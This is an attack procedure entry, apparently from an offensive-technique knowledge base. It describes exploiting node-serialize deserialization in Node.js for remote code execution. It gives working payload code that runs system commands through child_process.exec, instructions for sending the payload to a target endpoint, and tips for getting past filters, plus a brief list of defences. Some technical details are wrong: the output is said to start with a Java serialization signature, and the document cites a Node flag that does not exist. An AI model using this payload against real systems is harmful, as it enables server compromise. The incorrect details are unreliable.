---
id: 57ebdd19-5830-4b32-8377-6f4cde947d2d
type: procedure
name: Node-Deserialization-RCE-using-node-serialize
verified: true
submitted: false
created_at: '2023-04-06T03:55:59.260914+00:00'
updated_at: '2023-04-06T03:55:59.274399+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-and-Scripting-Interpreter|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Exploit]]'
  - '[[tags/Node Deserialization]]'
  - '[[tags/node-serialize]]'
commands: []
platforms:
  - Node.js
  - Web
tools:
  - '[[tools/node-serialize]]'
validated: true
---

# Node-Deserialization-RCE-using-node-serialize

## Summary

This procedure demonstrates how to exploit a Node.js deserialization vulnerability using the node-serialize module to achieve remote code execution (RCE) on a target server. By crafting a malicious serialized payload that includes a function to execute system commands via child_process.exec, an attacker can trigger arbitrary code execution when the payload is deserialized by a vulnerable application.

## Description

Node.js deserialization vulnerabilities arise when untrusted data is deserialized without proper validation, allowing attackers to inject and execute malicious JavaScript objects. The node-serialize module, commonly used for object serialization, is particularly susceptible to this because it supports function deserialization, enabling RCE. In this procedure, a payload is created that defines an 'rce' function to run a system command (e.g., 'ls /'). The serialized form is then modified to invoke the function immediately upon deserialization. This technique targets web applications or APIs that accept and deserialize user-controlled input, such as session data or configuration objects. Success results in command execution on the server, potentially leading to full compromise. The target environment is a Node.js server running a vulnerable application using node-serialize, accessible over the network for payload delivery (e.g., via HTTP POST).

## Requirements

1. Network access to the target Node.js application endpoint that accepts and deserializes user input.
2. Node.js environment on the attacker's machine to generate the payload.
3. node-serialize module installed on the attacker's machine (via npm).
4. Knowledge of the deserialization entry point (e.g., a specific API route).

## Defense

- Avoid using node-serialize in production; opt for safer alternatives like JSON.parse with validation.
- Implement strict input validation and sanitization to prevent untrusted data deserialization.
- Deploy a web application firewall (WAF) to detect patterns indicative of deserialization attacks, such as '_$$ND_FUNC$$_' strings.
- Enable Node.js security features like --disable-prototype-pollution and monitor for unexpected child_process executions.
- Use runtime application self-protection (RASP) tools to block deserialization of functions.

## Objectives

1. Generate a malicious serialized payload containing an RCE function.
2. Modify the payload to force immediate function execution upon deserialization.
3. Deliver the payload to the target for deserialization and command execution.
4. Achieve remote code execution on the target system.

## Instructions

### Step 1: Generate Serialized RCE Payload

**Context**: Create a JavaScript object with an 'rce' function that executes a system command using child_process.exec. Serialize this object using node-serialize to produce a string that can be sent to the target. This step prepares the base payload; the command executed (e.g., 'ls /') should be customized based on the objective, such as reconnaissance or further exploitation.

**Code** ([[codes/Generate-Node-Serialize-RCE-Payload]]):

```js
var y = {
    rce : function(){
        require('child_process').exec('ls /', function(error,
        stdout, stderr) { console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

> Run this code in a Node.js environment (e.g., node payload.js) to output the serialized string. The expected output is a long base64-like string starting with 'rO0ABX...' or similar, representing the serialized object. Verify by checking the console for the 'Serialized:' prefix followed by the payload. If the module is not installed, run 'npm install node-serialize' first. This step confirms the payload structure before modification.

### Step 2: Modify Payload for Immediate Execution

**Context**: Alter the serialized output from Step 1 to append '()' after the function definition, forcing it to execute during deserialization. This exploits node-serialize's handling of functions marked with '_$$ND_FUNC$$_'. Replace the original serialized value for the 'rce' key with this format and deliver it to the target (e.g., via a crafted HTTP request to the deserialization endpoint). Customize the command inside the function for the desired RCE action.

**Code** ([[codes/Malicious-Node-Serialize-Deserialization-Payload]]):

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

> This is the modified payload string ready for submission. Send it to the vulnerable deserializer (e.g., using curl or a proxy like Burp Suite). Expected output on success is the execution of the command on the target server, visible in application logs or response if the command outputs to stdout. If no output appears, check for errors in deserialization or adjust the delivery method. Decision point: If the target filters certain strings, encode the payload further or use alternative commands.
